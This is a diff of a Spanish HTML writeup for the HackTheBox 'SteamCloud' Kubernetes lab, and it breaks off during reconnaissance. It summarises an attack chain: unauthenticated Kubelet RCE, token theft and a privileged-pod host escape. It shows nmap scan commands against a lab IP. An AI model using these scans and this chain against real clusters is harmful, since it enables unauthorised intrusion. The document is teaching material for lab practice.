@@ -1,325 +1,184 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SteamCloud — HTB Report</title>
-<style>
-:root {
-  --accent: #4ade80;
-  --accent-dim: #16a34a;
-  --accent-glow: rgba(74,222,128,0.15);
-  --bg: #0a0e1a;
-  --bg2: #0f1629;
-  --bg3: #141d35;
-  --card: #111827;
-  --card2: #1a2540;
-  --border: #1e2d4a;
-  --text: #e2e8f0;
-  --text-muted: #64748b;
-  --text-dim: #94a3b8;
-  --red: #f87171;
-  --yellow: #fbbf24;
-  --blue: #60a5fa;
-  --purple: #a78bfa;
-  --orange: #fb923c;
-  --cyan: #22d3ee;
-  --green: #4ade80;
-}
-* { box-sizing: border-box; margin: 0; padding: 0; }
-body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', system-ui, sans-serif; font-size: 15px; line-height: 1.6; }
-a { color: var(--accent); text-decoration: none; }
-
-/* HERO */
-.hero {
-  background: linear-gradient(135deg, #0a0e1a, #0d1a2b, #091a10);
-  padding: 64px 32px 48px;
-  position: relative;
-  overflow: hidden;
-  border-bottom: 1px solid var(--border);
-}
-.hero::before {
-  content: '';
-  position: absolute; top: -80px; right: -80px;
-  width: 400px; height: 400px;
-  background: radial-gradient(circle, rgba(74,222,128,0.08) 0%, transparent 70%);
-  pointer-events: none;
-}
-.hero-watermark {
-  position: absolute; right: 40px; top: 20px;
-  font-size: 180px; font-weight: 900; color: var(--accent);
-  opacity: 0.04; line-height: 1; user-select: none;
-  font-family: monospace;
-}
-.tags { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 20px; }
-.tag { padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase; }
-.tag-platform { background: rgba(74,222,128,0.15); color: var(--green); border: 1px solid rgba(74,222,128,0.3); }
-.tag-easy { background: rgba(74,222,128,0.12); color: var(--green); border: 1px solid rgba(74,222,128,0.25); }
-.tag-medium { background: rgba(251,191,36,0.12); color: var(--yellow); border: 1px solid rgba(251,191,36,0.25); }
-.tag-os { background: rgba(167,139,250,0.12); color: var(--purple); border: 1px solid rgba(167,139,250,0.25); }
-.tag-pwned { background: rgba(74,222,128,0.2); color: var(--green); border: 1px solid rgba(74,222,128,0.4); }
-.hero h1 { font-size: 48px; font-weight: 800; color: var(--text); letter-spacing: -1px; margin-bottom: 12px; }
-.hero h1 span { color: var(--accent); }
-.hero-sub { color: var(--text-dim); font-size: 16px; margin-bottom: 32px; max-width: 600px; }
-.hero-stats { display: flex; gap: 32px; flex-wrap: wrap; }
-.hero-stat { display: flex; flex-direction: column; }
-.hero-stat .val { font-size: 22px; font-weight: 700; color: var(--accent); font-family: monospace; }
-.hero-stat .lbl { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; }
-
-/* LAYOUT */
-.container { max-width: 1400px; margin: 0 auto; padding: 32px; }
-.quick-stats { display: grid; grid-template-columns: repeat(4,1fr); gap: 16px; margin-bottom: 32px; }
-.qstat { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 20px; text-align: center; }
-.qstat .num { font-size: 32px; font-weight: 800; color: var(--accent); font-family: monospace; }
-.qstat .lbl { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-top: 4px; }
-
-.grid { display: grid; grid-template-columns: 1fr 300px; gap: 24px; }
-.main { display: flex; flex-direction: column; gap: 24px; }
-.sidebar { display: flex; flex-direction: column; gap: 16px; position: sticky; top: 24px; align-self: start; }
-
-/* CARDS */
-.card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
-.card-header { padding: 16px 20px; border-bottom: 1px solid var(--border); display: flex; align-items: center; gap: 12px; }
-.section-number { width: 30px; height: 30px; background: var(--accent); color: #000; border-radius: 6px; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 13px; flex-shrink: 0; }
-.card-header h2 { font-size: 16px; font-weight: 700; color: var(--text); }
-.card-body { padding: 20px; }
-
-/* SIDEBAR CARDS */
-.scard { background: var(--card); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; }
-.scard-title { padding: 12px 16px; background: var(--bg3); border-bottom: 1px solid var(--border); font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-dim); }
-.scard-body { padding: 14px 16px; }
-.sinfo-row { display: flex; justify-content: space-between; align-items: flex-start; padding: 5px 0; border-bottom: 1px solid rgba(30,45,74,0.5); font-size: 13px; gap: 8px; }
-.sinfo-row:last-child { border-bottom: none; }
-.sinfo-label { color: var(--text-muted); flex-shrink: 0; }
-.sinfo-value { color: var(--text); text-align: right; font-family: monospace; font-size: 12px; }
-
-/* CODE BLOCKS */
-.code-block { background: #050810; border: 1px solid var(--border); border-radius: 8px; overflow: hidden; margin: 12px 0; }
-.code-label { background: var(--bg3); padding: 6px 14px; font-size: 11px; color: var(--text-muted); letter-spacing: 0.5px; font-family: monospace; border-bottom: 1px solid var(--border); }
-.code-body { padding: 14px; font-family: 'Courier New', monospace; font-size: 13px; line-height: 1.7; overflow-x: auto; white-space: pre; }
-.cmd { color: var(--green); }
-.param { color: var(--cyan); }
-.ip { color: var(--orange); }
-.user { color: var(--purple); }
-.path { color: var(--blue); }
-.comment { color: var(--text-muted); font-style: italic; }
-.success { color: var(--green); font-weight: 600; }
-.highlight { color: var(--red); font-weight: 600; }
-.flag-hl { color: var(--yellow); font-weight: 700; background: rgba(251,191,36,0.1); padding: 1px 4px; border-radius: 3px; }
-.output { color: var(--text-dim); }
-
-/* CALLOUTS */
-.callout { padding: 14px 16px; border-radius: 8px; margin: 12px 0; font-size: 14px; border-left: 4px solid; }
-.callout-info { background: rgba(96,165,250,0.08); border-color: var(--blue); color: var(--blue); }
-.callout-warn { background: rgba(251,191,36,0.08); border-color: var(--yellow); color: var(--yellow); }
-.callout-danger { background: rgba(248,113,113,0.08); border-color: var(--red); color: var(--red); }
-.callout-tip { background: rgba(74,222,128,0.08); border-color: var(--green); color: var(--green); }
-
-/* STEP BOXES */
-.step-box { background: var(--card2); border: 1px solid var(--border); border-radius: 10px; margin: 16px 0; overflow: hidden; }
-.step-header { background: var(--bg3); padding: 12px 16px; border-bottom: 1px solid var(--border); display: flex; align-items: center; gap: 10px; }
-.step-num { background: var(--accent); color: #000; width: 26px; height: 26px; border-radius: 5px; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 12px; flex-shrink: 0; }
-.step-title { font-weight: 700; color: var(--text); font-size: 14px; }
-.step-body { padding: 16px; }
-.why-box { background: rgba(96,165,250,0.06); border: 1px solid rgba(96,165,250,0.15); border-radius: 6px; padding: 10px 14px; margin-bottom: 12px; font-size: 13px; color: var(--blue); }
-.interpret-box { background: rgba(74,222,128,0.06); border: 1px solid rgba(74,222,128,0.15); border-radius: 6px; padding: 10px 14px; margin-top: 10px; font-size: 13px; color: var(--green); }
-.decision-box { background: rgba(251,113,0,0.06); border: 1px solid rgba(251,113,0,0.2); border-radius: 6px; padding: 10px 14px; margin-top: 8px; font-size: 13px; color: var(--orange); }
-
-/* TIMELINE */
-.timeline { padding-left: 28px; position: relative; }
-.timeline::before { content: ''; position: absolute; left: 6px; top: 0; bottom: 0; width: 2px; background: var(--border); }
-.tl-item { position: relative; margin-bottom: 20px; }
-.tl-dot { position: absolute; left: -25px; top: 4px; width: 12px; height: 12px; border-radius: 50%; border: 2px solid; background: var(--bg); }
-.tl-dot.green { border-color: var(--green); }
-.tl-dot.blue { border-color: var(--blue); }
-.tl-dot.yellow { border-color: var(--yellow); }
-.tl-dot.red { border-color: var(--red); }
-.tl-time { font-size: 11px; color: var(--text-muted); font-family: monospace; margin-bottom: 3px; }
-.tl-title { font-weight: 600; color: var(--text); font-size: 14px; }
-.tl-desc { font-size: 13px; color: var(--text-dim); margin-top: 2px; }
-
-/* VULN CARD */
-.vuln-card { border-left: 4px solid var(--red); background: var(--card2); border-radius: 0 8px 8px 0; padding: 16px; margin: 12px 0; }
-.vuln-name { font-weight: 700; color: var(--red); font-size: 15px; }
-.vuln-desc { font-size: 13px; color: var(--text-dim); margin-top: 6px; }
-
-/* FLAG BOX */
-.flag-box { display: flex; align-items: center; gap: 16px; background: linear-gradient(135deg, rgba(74,222,128,0.1), rgba(74,222,128,0.05)); border: 1px solid rgba(74,222,128,0.3); border-radius: 10px; padding: 16px 20px; }
-.flag-icon { font-size: 32px; }
-.flag-content { flex: 1; }
-.flag-label { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px; }
-.flag-value { font-family: monospace; font-size: 15px; font-weight: 700; color: var(--yellow); letter-spacing: 1px; }
-
-/* BADGES */
-.badge { padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
-.badge-red { background: rgba(248,113,113,0.12); color: var(--red); }
-.badge-yellow { background: rgba(251,191,36,0.12); color: var(--yellow); }
-.badge-blue { background: rgba(96,165,250,0.12); color: var(--blue); }
-.badge-green { background: rgba(74,222,128,0.12); color: var(--green); }
-.badge-orange { background: rgba(251,146,60,0.12); color: var(--orange); }
-.badge-cyan { background: rgba(34,211,238,0.12); color: var(--cyan); }
-
-/* REC GRID */
-.rec-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 12px; }
-.rec-card { background: var(--bg3); border: 1px solid var(--border); border-radius: 8px; padding: 14px; }
-.rec-priority { font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px; }
-.rec-title { font-size: 13px; font-weight: 600; color: var(--text); margin-bottom: 4px; }
-.rec-desc { font-size: 12px; color: var(--text-muted); }
-
-/* MITRE */
-.mitre-item { display: flex; gap: 8px; align-items: flex-start; padding: 6px 0; border-bottom: 1px solid rgba(30,45,74,0.5); font-size: 12px; }
-.mitre-item:last-child { border-bottom: none; }
-.mitre-id { font-family: monospace; color: var(--green); font-weight: 700; flex-shrink: 0; font-size: 11px; }
-.mitre-name { color: var(--text-dim); }
-
-/* TOC */
-.toc-item { display: flex; align-items: center; gap: 8px; padding: 5px 0; font-size: 13px; border-bottom: 1px solid rgba(30,45,74,0.3); }
-.toc-item:last-child { border-bottom: none; }
-.toc-num { color: var(--accent); font-weight: 700; font-family: monospace; font-size: 11px; width: 20px; }
-
-/* TOOLS LIST */
-.tool-item { display: flex; align-items: center; gap: 8px; padding: 5px 0; font-size: 12px; border-bottom: 1px solid rgba(30,45,74,0.3); }
-.tool-item:last-child { border-bottom: none; }
-.tool-icon { font-size: 14px; }
-.tool-name { color: var(--accent); font-family: monospace; font-size: 12px; }
-.tool-desc { color: var(--text-muted); font-size: 11px; }
-
-/* GLOSSARY */
-.gloss-item { padding: 8px 0; border-bottom: 1px solid rgba(30,45,74,0.4); font-size: 13px; }
-.gloss-item:last-child { border-bottom: none; }
-.gloss-term { color: var(--cyan); font-weight: 700; font-family: monospace; }
-.gloss-def { color: var(--text-dim); margin-top: 2px; }
-
-/* ATTACK DIAGRAM */
-.attack-chain { display: flex; flex-direction: column; gap: 8px; }
-.chain-step { display: flex; align-items: center; gap: 12px; padding: 10px 14px; background: var(--bg3); border: 1px solid var(--border); border-radius: 8px; font-size: 13px; }
-.chain-arrow { color: var(--accent); font-weight: 900; font-size: 20px; text-align: center; line-height: 1; }
-.chain-icon { font-size: 18px; }
-.chain-text { flex: 1; }
-.chain-label { font-weight: 600; color: var(--text); }
-.chain-detail { font-size: 11px; color: var(--text-muted); font-family: monospace; }
-
-/* FOOTER */
-footer { background: var(--bg2); border-top: 1px solid var(--border); padding: 24px 32px; text-align: center; color: var(--text-muted); font-size: 13px; margin-top: 40px; }
-
-p { color: var(--text-dim); font-size: 14px; line-height: 1.7; margin-bottom: 10px; }
-h3 { color: var(--text); font-size: 15px; font-weight: 700; margin: 16px 0 8px; }
-ul { color: var(--text-dim); font-size: 14px; padding-left: 20px; margin: 8px 0; }
-ul li { margin-bottom: 4px; }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SteamCloud — HTB Writeup | YRD</title>
+  <style>
+    :root { --bg:#0a0e1a;--card-bg:#111827;--border:#1e2d4a;--primary:#4ade80;--cyan:#22d3ee;--text:#e2e8f0;--text-dim:#94a3b8;--text-muted:#64748b;--red:#f87171;--yellow:#fbbf24;--purple:#a78bfa;--orange:#fb923c; }
+    *{margin:0;padding:0;box-sizing:border-box;}
+    body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;}
+    canvas#matrix{position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.13;pointer-events:none;z-index:0;}
+    .hero{position:relative;z-index:10;padding:3rem 2rem 2rem;max-width:1200px;margin:0 auto;}
+    .hero-breadcrumb{font-size:0.8rem;color:var(--text-muted);margin-bottom:1rem;}
+    .hero-breadcrumb a{color:var(--primary);text-decoration:none;}
+    .tags{display:flex;flex-wrap:wrap;gap:0.5rem;margin-bottom:1.5rem;}
+    .tag{padding:4px 12px;border-radius:20px;font-size:0.75rem;font-weight:600;letter-spacing:1px;text-transform:uppercase;}
+    .tag-htb{background:rgba(74,222,128,0.15);color:var(--primary);border:1px solid rgba(74,222,128,0.3);}
+    .tag-hmv{background:rgba(217,70,239,0.15);color:#d946ef;border:1px solid rgba(217,70,239,0.3);}
+    .tag-sherlock{background:rgba(34,211,238,0.15);color:var(--cyan);border:1px solid rgba(34,211,238,0.3);}
+    .tag-os{background:rgba(34,211,238,0.1);color:var(--cyan);border:1px solid rgba(34,211,238,0.25);}
+    .tag-easy{background:rgba(74,222,128,0.1);color:#4ade80;border:1px solid rgba(74,222,128,0.3);}
+    .tag-veryeasy{background:rgba(217,70,239,0.1);color:#d946ef;border:1px solid rgba(217,70,239,0.3);}
+    .tag-medium{background:rgba(251,191,36,0.1);color:var(--yellow);border:1px solid rgba(251,191,36,0.3);}
+    .tag-hard{background:rgba(248,113,113,0.1);color:var(--red);border:1px solid rgba(248,113,113,0.3);}
+    .hero h1{font-size:2.8rem;font-weight:800;line-height:1.2;margin-bottom:1rem;}
+    .hero h1 span{color:var(--primary);}
+    .hero-desc{font-size:1.05rem;color:var(--text-dim);line-height:1.7;max-width:700px;margin-bottom:1.5rem;}
+    .meta-row{display:flex;flex-wrap:wrap;gap:2rem;}
+    .meta-item{display:flex;flex-direction:column;gap:4px;}
+    .meta-label{font-size:0.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;}
+    .meta-value{font-size:0.9rem;color:var(--text);font-weight:600;}
+    .meta-value.green{color:var(--primary);}
+    .main{position:relative;z-index:10;max-width:1200px;margin:0 auto;padding:2rem;display:grid;grid-template-columns:1fr 280px;gap:1.5rem;}
+    @media(max-width:900px){.main{grid-template-columns:1fr;}}
+    .content{display:flex;flex-direction:column;gap:2rem;}
+    .section{background:var(--card-bg);border:1px solid var(--border);border-radius:12px;padding:1.75rem;}
+    .section-header{display:flex;align-items:center;gap:10px;margin-bottom:1.25rem;padding-bottom:0.75rem;border-bottom:1px solid var(--border);}
+    .section-icon{width:8px;height:8px;background:var(--primary);border-radius:50%;box-shadow:0 0 8px var(--primary);}
+    .section h2{font-size:1.1rem;font-weight:700;color:var(--primary);text-transform:uppercase;letter-spacing:2px;}
+    .section p{color:var(--text-dim);line-height:1.8;margin-bottom:0.75rem;}
+    .section p:last-child{margin-bottom:0;}
+    .section ul,.section ol{color:var(--text-dim);line-height:1.8;margin:0.5rem 0 0.75rem 1.5rem;}
+    .section li{margin-bottom:0.3rem;}
+    pre{background:#050810;border:1px solid var(--border);border-radius:8px;padding:2.5rem 1.25rem 1.25rem;overflow-x:auto;margin:1rem 0;font-size:0.82rem;line-height:1.6;position:relative;}
+    pre::before{content:'terminal';position:absolute;top:0;left:0;right:0;padding:8px 14px 8px 70px;background:#141d35;border-bottom:1px solid var(--border);border-radius:8px 8px 0 0;font-size:12px;color:var(--text-muted);font-family:'Segoe UI',system-ui,sans-serif;}
+    pre::after{content:'';position:absolute;top:10px;left:14px;width:12px;height:12px;border-radius:50%;background:#ff5f57;box-shadow:20px 0 0 #febc2e,40px 0 0 #28c840;}
+    code{font-family:'Cascadia Code','Fira Code','Courier New',monospace;}
+    .comment{color:#6a9955;}
+    .cmd{color:var(--cyan);}
+    .output{color:var(--text-dim);}
+    .highlight{color:var(--primary);font-weight:600;}
+    .cred{color:var(--yellow);font-weight:600;}
+    .flag-val{color:#ff79c6;}
+    .ip-badge{display:inline-block;background:rgba(74,222,128,0.1);border:1px solid rgba(74,222,128,0.3);color:var(--primary);padding:3px 10px;border-radius:6px;font-family:monospace;font-size:0.8rem;}
+    .flags-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-top:1rem;}
+    .flag-card{background:#050810;border:1px solid var(--border);border-radius:10px;padding:1.25rem;}
+    .flag-card .flag-label{font-size:0.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:0.5rem;}
+    .flag-card .flag-hash{font-family:monospace;font-size:0.8rem;color:#ff79c6;word-break:break-all;}
+    .timeline{display:flex;flex-direction:column;gap:0;}
+    .timeline-item{display:flex;gap:1.25rem;}
+    .timeline-left{display:flex;flex-direction:column;align-items:center;}
+    .timeline-dot{width:12px;height:12px;background:var(--primary);border-radius:50%;box-shadow:0 0 10px var(--primary);flex-shrink:0;margin-top:4px;}
+    .timeline-line{width:2px;background:var(--border);flex:1;min-height:30px;}
+    .timeline-item:last-child .timeline-line{display:none;}
+    .timeline-content{padding-bottom:1.5rem;}
+    .timeline-step{font-size:0.7rem;color:var(--primary);text-transform:uppercase;letter-spacing:1px;font-weight:700;}
+    .timeline-title{font-size:0.95rem;color:var(--text);font-weight:600;margin:2px 0;}
+    .timeline-desc{font-size:0.82rem;color:var(--text-dim);line-height:1.6;}
+    .mitre-grid{display:flex;flex-wrap:wrap;gap:0.5rem;margin-top:1rem;}
+    .mitre-tag{background:rgba(74,222,128,0.08);border:1px solid rgba(74,222,128,0.2);color:var(--text-dim);padding:5px 12px;border-radius:6px;font-size:0.78rem;font-family:monospace;}
+    .sidebar{display:flex;flex-direction:column;gap:1.5rem;}
+    .sidebar-card{background:var(--card-bg);border:1px solid var(--border);border-radius:12px;padding:1.5rem;}
+    .sidebar-card h3{font-size:0.8rem;text-transform:uppercase;letter-spacing:2px;color:var(--primary);margin-bottom:1.25rem;padding-bottom:0.5rem;border-bottom:1px solid var(--border);}
+    .detail-row{display:flex;justify-content:space-between;align-items:center;padding:0.5rem 0;border-bottom:1px solid rgba(26,61,26,0.5);}
+    .detail-row:last-child{border-bottom:none;}
+    .detail-key{font-size:0.8rem;color:var(--text-muted);}
+    .detail-val{font-size:0.82rem;color:var(--text);font-weight:600;text-align:right;}
+    .detail-val.green{color:var(--primary);}
+    .detail-val.cyan{color:var(--cyan);}
+    .skill-item{margin-bottom:1rem;}
+    .skill-item:last-child{margin-bottom:0;}
+    .skill-header{display:flex;justify-content:space-between;margin-bottom:5px;}
+    .skill-name{font-size:0.82rem;color:var(--text-dim);}
+    .skill-pct{font-size:0.8rem;color:var(--primary);font-weight:600;}
+    .skill-bar{height:4px;background:var(--border);border-radius:2px;}
+    .skill-fill{height:100%;background:linear-gradient(90deg,var(--primary),var(--cyan));border-radius:2px;}
+    .tools-list{display:flex;flex-direction:column;gap:0.6rem;}
+    .tool-item{display:flex;align-items:center;gap:10px;padding:0.6rem 0.75rem;background:#050810;border:1px solid var(--border);border-radius:8px;}
+    .tool-dot{width:6px;height:6px;background:var(--primary);border-radius:50%;}
+    .tool-name{font-size:0.82rem;color:var(--text-dim);font-family:monospace;}
+    .callout{border-radius:8px;padding:1rem 1.25rem;margin:1rem 0;border-left:3px solid;}
+    .callout-info{background:rgba(34,211,238,0.05);border-color:var(--cyan);color:var(--text-dim);}
+    .callout-danger{background:rgba(248,113,113,0.05);border-color:var(--red);color:var(--text-dim);}
+    .callout-tip{background:rgba(74,222,128,0.05);border-color:var(--primary);color:var(--text-dim);}
+    .callout-warn{background:rgba(251,191,36,0.05);border-color:var(--yellow);color:var(--text-dim);}
+    .data-table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:0.85rem;}
+    .data-table th,.data-table td{padding:0.6rem 0.8rem;border:1px solid var(--border);text-align:left;}
+    .data-table th{background:#141d35;color:var(--primary);font-weight:600;font-size:0.8rem;text-transform:uppercase;letter-spacing:0.5px;}
+    .data-table td{color:var(--text-dim);}
+    a{color:var(--primary);text-decoration:none;}
+  </style>
 </head>
 <body>
+<canvas id="matrix"></canvas>
 
-<!-- HERO -->
 <div class="hero">
-  <div class="hero-watermark">&gt;</div>
+  <div class="hero-breadcrumb"><a href="#">HTB Máquinas</a> / <a href="#">Linux</a> / SteamCloud</div>
   <div class="tags">
-    <span class="tag tag-platform">HackTheBox</span>
-    <span class="tag tag-easy">Easy</span>
-    <span class="tag tag-os">Linux</span>
-    <span class="tag tag-pwned">Pwned ✓</span>
-    <span class="tag" style="background:rgba(34,211,238,0.12);color:var(--cyan);border:1px solid rgba(34,211,238,0.25);">Kubernetes</span>
-    <span class="tag" style="background:rgba(96,165,250,0.12);color:var(--blue);border:1px solid rgba(96,165,250,0.25);">Container Escape</span>
+    <span class="tag tag-htb">HTB</span>
+    <span class="tag tag-os">LINUX</span>
+    <span class="tag tag-easy">EASY</span>
+    <span class="tag tag-htb">MACHINE</span>
   </div>
-  <h1>Steam<span>Cloud</span></h1>
-  <div class="hero-sub">Kubernetes misconfiguration → Kubelet anonymous RCE → Service Account token → Privileged Pod creation → Host filesystem escape → Root</div>
-  <div class="hero-stats">
-    <div class="hero-stat"><span class="val">10.129.96.167</span><span class="lbl">Target IP</span></div>
-    <div class="hero-stat"><span class="val">Easy</span><span class="lbl">Difficulty</span></div>
-    <div class="hero-stat"><span class="val">Linux</span><span class="lbl">OS</span></div>
-    <div class="hero-stat"><span class="val">v1.22.3</span><span class="lbl">Kubernetes</span></div>
-    <div class="hero-stat"><span class="val">2026-03-21</span><span class="lbl">Fecha</span></div>
+  <h1>SteamCloud <span>Machine</span></h1>
+  <p class="hero-desc">Kubelet API sin autenticación en puerto 10250. RCE en pods, extracción de ServiceAccount token, creación de pod privilegiado con hostPath mount y escape al filesystem del host como root.</p>
+  <div class="meta-row">
+    <div class="meta-item"><span class="meta-label">Autor</span><span class="meta-value green">Yoandy Ramírez Delgado</span></div>
+    <div class="meta-item"><span class="meta-label">Tipo</span><span class="meta-value">HTB Machine</span></div>
+    <div class="meta-item"><span class="meta-label">Herramienta Clave</span><span class="meta-value">nmap / kubectl</span></div>
+    <div class="meta-item"><span class="meta-label">Objetivo</span><span class="meta-value">root</span></div>
   </div>
 </div>
 
-<div class="container">
-
-<!-- QUICK STATS -->
-<div class="quick-stats">
-  <div class="qstat"><div class="num">7</div><div class="lbl">Puertos abiertos</div></div>
-  <div class="qstat"><div class="num">1</div><div class="lbl">CVE / Misconfiguration</div></div>
-  <div class="qstat"><div class="num">5</div><div class="lbl">Pasos al root</div></div>
-  <div class="qstat"><div class="num">~20m</div><div class="lbl">Tiempo total</div></div>
-</div>
-
-<!-- GRID: MAIN + SIDEBAR -->
-<div class="grid">
-
-<!-- MAIN -->
 <div class="main">
+  <div class="content">
 
-  <!-- 1: DESCRIPCIÓN -->
-  <div class="card">
-    <div class="card-header">
-      <div class="section-number">1</div>
-      <h2>Descripción de la Máquina</h2>
-    </div>
-    <div class="card-body">
-      <p>SteamCloud es una máquina Linux de dificultad Easy en HackTheBox que emula un entorno <strong>Kubernetes (Minikube)</strong> mal configurado. La vulnerabilidad central es el <strong>Kubelet API expuesto sin autenticación</strong> en el puerto 10250, que permite a un atacante listar pods, ejecutar comandos en containers, extraer service account tokens, y finalmente escalar privilegios creando un pod privilegiado que monta el sistema de archivos del host.</p>
-      <p>Esta máquina enseña conceptos fundamentales de seguridad en Kubernetes: cómo el Kubelet sin autenticación puede comprometer toda la infraestructura, cómo el RBAC mal configurado permite crear pods privilegiados, y cómo un contenedor privilegiado con <code>hostPath</code> mount equivale a acceso root al nodo host.</p>
-      <div class="callout callout-danger">
-        <strong>Vulnerabilidad crítica:</strong> Kubelet API en puerto 10250 accesible sin autenticación → permite RCE como root en cualquier pod del nodo → cadena completa al host.
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Descripción de la Máquina</h2></div>
+      <div class="card-body">
+<p>SteamCloud es una máquina Linux de dificultad Easy en HackTheBox que emula un entorno <strong>Kubernetes (Minikube)</strong> mal configurado. La vulnerabilidad central es el <strong>Kubelet API expuesto sin autenticación</strong> en el puerto 10250, que permite a un atacante listar pods, ejecutar comandos en containers, extraer service account tokens, y finalmente escalar privilegios creando un pod privilegiado que monta el sistema de archivos del host.</p>
+<p>Esta máquina enseña conceptos fundamentales de seguridad en Kubernetes: cómo el Kubelet sin autenticación puede comprometer toda la infraestructura, cómo el RBAC mal configurado permite crear pods privilegiados, y cómo un contenedor privilegiado con <code>hostPath</code> mount equivale a acceso root al nodo host.</p>
+<div class="callout callout-danger">
+<strong>Vulnerabilidad crítica:</strong> Kubelet API en puerto 10250 accesible sin autenticación → permite RCE como root en cualquier pod del nodo → cadena completa al host.
       </div>
+</div>
     </div>
-  </div>
 
-  <!-- 2: RECONOCIMIENTO -->
-  <div class="card">
-    <div class="card-header">
-      <div class="section-number">2</div>
-      <h2>Reconocimiento</h2>
-    </div>
-    <div class="card-body">
-
-      <div class="step-box">
-        <div class="step-header">
-          <div class="step-num">1</div>
-          <div class="step-title">Escaneo completo de puertos — Descubrimiento de superficie</div>
-        </div>
-        <div class="step-body">
-          <div class="why-box">
-            <strong>¿Por qué?</strong> Siempre comenzamos con un escaneo de TODOS los puertos (65535) para no perdernos servicios en puertos no estándar. SteamCloud corre Kubernetes que usa puertos específicos (2379, 8443, 10250, etc.) que un scan del top-1000 no incluiría por defecto.
+    <div class="section">
+      <div class="section-header"><div class="section-icon"></div><h2>Reconocimiento</h2></div>
+      <div class="card-body">
+<div class="step-box">
+<div class="step-header">
+<div class="step-num">1</div>
+<div class="step-title">Escaneo completo de puertos — Descubrimiento de superficie</div>
+</div>
+<div class="step-body">
+<div class="why-box">
+<strong>¿Por qué?</strong> Siempre comenzamos con un escaneo de TODOS los puertos (65535) para no perdernos servicios en puertos no estándar. SteamCloud corre Kubernetes que usa puertos específicos (2379, 8443, 10250, etc.) que un scan del top-1000 no incluiría por defecto.
           </div>
-          <div class="code-block">
-            <div class="code-label">bash — Fase 1: Descubrimiento de puertos</div>
-            <div class="code-body"><span class="cmd">nmap</span> <span class="param">-p-</span> <span class="param">--open</span> <span class="param">-n</span> <span class="param">-T4</span> <span class="param">-sS</span> <span class="ip">10.129.96.167</span>
+<pre><code><span class="cmd">nmap</span> <span class="param">-p-</span> <span class="param">--open</span> <span class="param">-n</span> <span class="param">-T4</span> <span class="param">-sS</span> <span class="ip">10.129.96.167</span>
 <span class="comment"># -p-     → escanear los 65535 puertos</span>
 <span class="comment"># --open  → mostrar solo puertos abiertos</span>
 <span class="comment"># -n      → no hacer resolución DNS (más rápido)</span>
 <span class="comment"># -T4     → velocidad agresiva pero confiable</span>
 <span class="comment"># -sS     → SYN scan (stealth, no completa TCP handshake)</span>
-
 <span class="success">Puertos descubiertos: 22, 2379, 2380, 8443, 10249, 10250, 10256</span></div>
-          </div>
-          <div class="interpret-box">
-            <strong>Interpretación:</strong> El patrón de puertos es inequívoco — <strong>este servidor corre Kubernetes</strong>:
+</div>
+<div class="interpret-box">
+<strong>Interpretación:</strong> El patrón de puertos es inequívoco — <strong>este servidor corre Kubernetes</strong>:
             <ul style="margin-top:6px; color: var(--green)">
-              <li>2379/2380 = etcd (base de datos de Kubernetes)</li>
-              <li>8443 = Kubernetes API Server</li>
-              <li>10249/10250/10256 = Kubelet (agente de nodo)</li>
-            </ul>
+<li>2379/2380 = etcd (base de datos de Kubernetes)</li>
+<li>8443 = Kubernetes API Server</li>
+<li>10249/10250/10256 = Kubelet (agente de nodo)</li>
+</ul>
+</div>
+</div>
+</div>
+<div class="step-box">
+<div class="step-header">
+<div class="step-num">2</div>
+<div class="step-title">Enumeración detallada de servicios</div>
+</div>
+<div class="step-body">
+<div class="why-box">
+<strong>¿Por qué?</strong> Con los puertos identificados, ejecutamos <code>-sC -sV</code> para obtener versiones exactas y ejecutar scripts NSE que revelan información crítica (certificados TLS, banners, etc.).
           </div>
-        </div>
-      </div>
-
-      <div class="step-box">
-        <div class="step-header">
-          <div class="step-num">2</div>
-          <div class="step-title">Enumeración detallada de servicios</div>
-        </div>
-        <div class="step-body">
-          <div class="why-box">
-            <strong>¿Por qué?</strong> Con los puertos identificados, ejecutamos <code>-sC -sV</code> para obtener versiones exactas y ejecutar scripts NSE que revelan información crítica (certificados TLS, banners, etc.).
-          </div>
-          <div class="code-block">
-            <div class="code-label">bash — Fase 2: Enumeración de servicios</div>
-            <div class="code-body"><span class="cmd">nmap</span> <span class="param">-p22,2379,2380,8443,10249,10250,10256</span> <span class="param">-sC</span> <span class="param">-sV</span> <span class="param">-n</span> <span class="ip">10.129.96.167</span>
+<pre><code><span class="cmd">nmap</span> <span class="param">-p22,2379,2380,8443,10249,10250,10256</span> <span class="param">-sC</span> <span class="param">-sV</span> <span class="param">-n</span> <span class="ip">10.129.96.167</span>
 <span class="comment"># -sC → ejecutar scripts NSE por defecto</span>
 <span class="comment"># -sV → detectar versiones de servicios</span></div>
-          </div>
-          <div class="code-block">
-            <div class="code-label">output — Hallazgos críticos del cert TLS en 8443</div>
-            <div class="code-body"><span class="output">PORT      SERVICE  VERSION
+</div>
